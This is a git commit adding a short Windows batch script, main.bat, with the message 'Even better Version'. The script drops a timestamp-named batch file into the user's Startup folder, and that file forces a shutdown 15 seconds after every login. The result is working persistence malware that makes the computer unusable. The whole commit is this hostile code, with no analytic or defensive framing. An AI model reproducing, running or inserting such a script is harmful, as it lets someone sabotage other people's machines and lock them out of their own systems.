5422315a69c498499e6ab0312584f9d9598c3a76
InformatykBartek <InformatykBartek@users.noreply.github.com>
2024-02-26 17:57:11 +0100

    Even better Version

---
+++ main.bat
@@ -0,0 +1,17 @@
+@echo off
+
+setlocal enabledelayedexpansion
+
+set "where=%~dp0"
+set "desktop=%USERPROFILE%\Desktop"
+set "here=C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+
+set "timestamp=%date:~4,2%%date:~7,2%%time:~0,2%%time:~3,2%%time:~6,2%"
+set "filename=%timestamp%"
+
+
+echo @echo off > "%here%\%filename%.bat"
+echo shutdown -s -t 15 >> "%here%\%filename%.bat"
+
+
+exit 0
